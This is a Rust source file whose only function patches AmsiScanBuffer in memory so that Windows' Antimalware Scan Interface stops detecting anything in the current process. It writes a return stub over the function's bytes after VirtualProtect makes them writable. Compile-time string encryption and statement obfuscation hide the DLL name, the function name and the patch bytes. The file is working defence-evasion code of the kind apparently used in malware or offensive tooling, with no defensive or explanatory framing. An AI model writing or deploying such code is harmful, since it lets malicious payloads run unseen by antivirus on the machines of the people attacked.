use std::ffi::CString;
use windows::core::PCSTR;
use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress, LoadLibraryA};
use windows::Win32::System::Memory::{VirtualProtect, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS};

pub fn patch_amsi() {
    goldberg::goldberg_stmts!({
        let dll_name = match CString::new(cryptify::encrypt_string!("amsi.dll")) {
            Ok(n) => n,
            Err(_) => return,
        };
        let fn_name = match CString::new(cryptify::encrypt_string!("AmsiScanBuffer")) {
            Ok(n) => n,
            Err(_) => return,
        };

        unsafe {
            let dll_pcstr = PCSTR(dll_name.as_ptr() as *const u8);
            let fn_pcstr = PCSTR(fn_name.as_ptr() as *const u8);
            let handle = GetModuleHandleA(dll_pcstr);
            let handle = if handle.is_err() {
                match LoadLibraryA(dll_pcstr) {
                    Ok(h) => h,
                    Err(_) => return,
                }
            } else {
                handle.unwrap()
            };

            let func = GetProcAddress(handle, fn_pcstr);
            let func = match func {
                Some(f) => f,
                None => return,
            };

            let mut old_protect = PAGE_PROTECTION_FLAGS(goldberg::goldberg_int!(0));

            let patch = if cfg!(target_pointer_width = "64") {
                &[
                    goldberg::goldberg_int!(0x31) as u8,
                    goldberg::goldberg_int!(0xc0) as u8,
                    goldberg::goldberg_int!(0xc3) as u8,
                ] as &[u8]
            } else {
                &[
                    goldberg::goldberg_int!(0x31) as u8,
                    goldberg::goldberg_int!(0xc0) as u8,
                    goldberg::goldberg_int!(0xc2) as u8,
                    goldberg::goldberg_int!(0x08) as u8,
                    goldberg::goldberg_int!(0x00) as u8,
                ] as &[u8]
            };

            if VirtualProtect(
                func as *const std::ffi::c_void,
                patch.len(),
                PAGE_EXECUTE_READWRITE,
                &mut old_protect,
            )
            .is_ok()
            {
                std::ptr::copy_nonoverlapping(patch.as_ptr(), func as *mut u8, patch.len());
                let _ = VirtualProtect(
                    func as *const std::ffi::c_void,
                    patch.len(),
                    old_protect,
                    &mut old_protect,
                );
            }
        }
    })
}
